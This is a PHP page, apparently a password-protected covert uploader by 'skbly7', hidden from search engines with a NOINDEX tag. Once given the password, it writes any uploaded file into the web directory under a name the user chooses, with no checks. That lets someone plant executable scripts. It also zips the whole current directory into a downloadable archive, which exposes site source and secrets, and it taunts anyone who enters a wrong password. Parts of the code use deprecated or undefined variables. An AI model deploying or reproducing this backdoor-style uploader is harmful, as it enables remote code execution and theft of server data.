<?php
	$skbly7=getcwd();
	ini_set('post_max_size', '64M');
	ini_set('max_execution_time', 20000);
	ini_set('upload_max_filesize', '64M');
if(sha1(md5($_POST['pass']))=="c854081c7041df2b35ebed9f8313fafe456874dc")
{
if($_POST['work']=="up")
{
	$path= $HTTP_POST_FILES['ufile']['name'];
	if($ufile !=none)
	{
	if(copy($HTTP_POST_FILES['ufile']['tmp_name'], $path))
	{
	echo "Successful<BR/>"; 

	//$HTTP_POST_FILES['ufile']['name'] = file name
	//$HTTP_POST_FILES['ufile']['size'] = file size
	//$HTTP_POST_FILES['ufile']['type'] = type of file

	echo "File Name :".$HTTP_POST_FILES['ufile']['name']."<BR/>"; 
	echo "File Size :".$HTTP_POST_FILES['ufile']['size']."<BR/>"; 
	echo "File Type :".$HTTP_POST_FILES['ufile']['type']."<BR/>"; 
	echo "<img src=\"$path\" width=\"150\" height=\"150\">";
	}
	else
	{
	echo "Error";
	}
	}
}
else if($_POST['work']=="down")
{
function Zip($source, $destination)
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }
 
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }
 
    $source = str_replace('\\', '/', realpath($source));
 
    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
 
        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));
 
            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    printf('done');
    return $zip->close();
}
Zip(getcwd(), 'compressed.zip');
}
else if($_POST['work']=="delete")
{
unlink('compressed.zip');
}
}
else if($_POST['pass'])
{
echo 'Thanks for trying !! But you dont have right trick to break it.. :P<br><br>';

}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
<title>File Uploader - skbly7</title>
</head>

<body>
<?php if($message) echo "<p>$message</p>"; 
	echo 'Upload your file to : '.$skbly7.'<br>Max file size limit is : '.ini_get('upload_max_filesize').'<br><br>';?>
<form enctype="multipart/form-data" method="post" action="">
<label>Choose a zip file to upload: <input type="file" name="ufile" id="ufile" /></label>
<p>Password : <input type="password" name="pass" /></p>
<select name="work" value="work">
<option value="up">Upload</option>
<option value="down">Download</option>
<option value="delete">Delete</option>
</select>
<br />
<input type="submit" name="submit" value="Upload" />
</form>
</body>
</html>